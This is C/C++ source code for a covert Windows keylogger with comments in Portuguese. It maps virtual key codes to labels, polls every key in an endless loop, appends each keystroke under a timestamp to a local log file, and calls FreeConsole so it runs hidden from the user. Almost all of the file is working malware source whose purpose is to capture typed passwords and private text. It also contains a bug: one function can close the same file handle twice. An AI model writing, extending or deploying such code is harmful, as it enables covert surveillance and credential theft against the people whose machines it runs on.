#include "keylogger.h"

using namespace std;

KEYLIST unrecogKeys[] = {
    {"<BACKSPACE>", VK_BACK},
    {"<ENTER>", VK_RETURN},
    {"<CTRL>", VK_RCONTROL},
    {"<CTRL>", VK_LCONTROL},
    {"<F1>", VK_F1},
    {"<F2>", VK_F2},
    {"<F3>", VK_F3},
    {"<F4>", VK_F4},
    {"<F5>", VK_F5},
    {"<F6>", VK_F6},
    {"<F7>", VK_F7},
    {"<F8>", VK_F8},
    {"<F9>", VK_F9},
    {"<F10>", VK_F10},
    {"<F11>", VK_F11},
    {"<F12>", VK_F12},
    {"<TAB>", VK_TAB},
    {"<ESC>", VK_ESCAPE},
    {"<SHIFT>", VK_LSHIFT},
    {"<SHIFT>", VK_RSHIFT},
    {"<ALT ESQ.>", VK_LMENU},
    {"<ALT DIR.>", VK_RMENU},
    {"<PRINTSCREEN>", VK_SNAPSHOT},
    {"<SCROLL-LOCK>", VK_SCROLL},
    {"<PAUSE-BREAK>", VK_PAUSE},
    {"<HOME>", VK_HOME},
    {"<PAGE UP>", VK_PRIOR},
    {"<PAGE DOWN>", VK_NEXT},
    {"<END>", VK_END},
    {"<DEL>", VK_DELETE},
    {"<INSERT>", VK_INSERT},
    {"*", 0x6A},
    {"/", 0x6F},
    {"-", 0x6D},
    {"+", 0x6B},
    {".", 0xC2},
    {"ç", 0xBA},
    {".", 0xBE},
    {",", 0xBC},
    {"-", 0xBD},
    {"< = + § >", 0xBB},
    {"<WIN>", 0x5B},
    {"<WIN>", 0x5C},
    {"</ ? °>", 0xC1},
    {"< \\ | >", 0xE2},
    {"<Ž `>", 0xDB},
    {"<NUMLOCK>", VK_NUMLOCK},
    {"<LEFT ARROW>", 0x25},
    {"<UP ARROW>", 0x26},
    {"<RIGHT ARROW>", 0x27},
    {"<DOWN ARROW>", 0x28},
    {"<~ ^>", 0xDE},
    {"<: ;>", 0xBF},
    {"< { [ >", 0xDD},
    {"< } ] >", 0xDC},
    {"<\" '>", 0xC0},
    {"0", VK_NUMPAD0},
    {"1", VK_NUMPAD1},
    {"2", VK_NUMPAD2},
    {"3", VK_NUMPAD3},
    {"4", VK_NUMPAD4},
    {"5", VK_NUMPAD5},
    {"6", VK_NUMPAD6},
    {"7", VK_NUMPAD7},
    {"8", VK_NUMPAD8},
    {"9", VK_NUMPAD9},
    {"0", 0x30},
    {"1", 0x31},
    {"2", 0x32},
    {"3", 0x33},
    {"4", 0x34},
    {"5", 0x35},
    {"6", 0x36},
    {"7", 0x37},
    {"8", 0x38},
    {"9", 0x39}
};

int KEYLIST_S = sizeof(unrecogKeys) / 8;

int CAPS_STATUS(void){
    if (GetKeyState(VK_CAPITAL) != 0) return 1;
    else return 0;
}

int getPressedKey(int ascV1, int ascV2){
    int pressedKey = 0;
    for(int character = ascV1; character <= ascV2; character++) {
        if(GetAsyncKeyState(character) == -0x7FFF) {
            pressedKey = character;
        }
    }
    return pressedKey;
}

void wKeys(int ascCode){
    FILE *f = fopen(DIR, "a+");
    for(int i = 0; i < KEYLIST_S; i++){
        if(ascCode == unrecogKeys[i].asciiKey){
            fprintf(f, "%s", unrecogKeys[i].keyName);
            fclose(f);
            break;
        }
    }

    if((CAPS_STATUS() == 1) && ((ascCode >= 97) && (ascCode <= 122))){
        ascCode -= 0x20;
    }else if((CAPS_STATUS() == 0) && ((ascCode >= 65) && (ascCode <= 90))){
        ascCode += 0x20;
    }

    fputc((char)ascCode, f);
    fclose(f);
}

void logDate(void){
    SYSTEMTIME time;
    GetLocalTime(&time);
    FILE *log = fopen(DIR, "a+");
    fprintf(log, "\n-------------------\n%d-%d-%d %d:%d:%d\n-------------------\n",
    time.wDay, time.wMonth, time.wYear, time.wHour, time.wMinute, time.wSecond);
    fclose(log);
}

void startLogging(void){
    int key = 0;
    for(;;){
        key = getPressedKey(8, 255);
        if((key != 0 ) && (key != 20) && (key != 93)){
            //printf("%i", (int)key);
            wKeys(key);
        }
    }
}

void clearLogs(void){
    FILE *f = fopen(DIR, "w+");
    fclose(f);
}

int main(void){
    FreeConsole();
    /* ====== INICIANDO FUNÇÕES ====== */
    logDate();
    startLogging();
    /* =============================== */
    return 0;
}
